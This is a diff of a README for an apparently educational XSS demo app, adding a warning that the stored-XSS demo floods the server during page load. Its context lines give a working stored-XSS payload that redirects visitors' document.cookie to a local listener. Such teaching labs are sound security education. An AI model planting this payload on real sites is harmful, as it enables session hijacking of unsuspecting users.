@@ -30,6 +30,7 @@ the page. If you want to clear the database, just delete the `database.db` file 
 * When the user clicks on the link containing the address, their cookies from the vulnerable website can be stolen
 
 # Demostration for Stored XSS
+### WARNING, this will spam ping the server as the page is loading
 * Key in `<script type='text/javascript'>document.location='http://127.0.0.1:1000/?c='+document.cookie;</script>` into the comment blank
 * Notice that the code is stored within the website
 * When the user access the website, their cookies will automatically stolen until the comment is removed
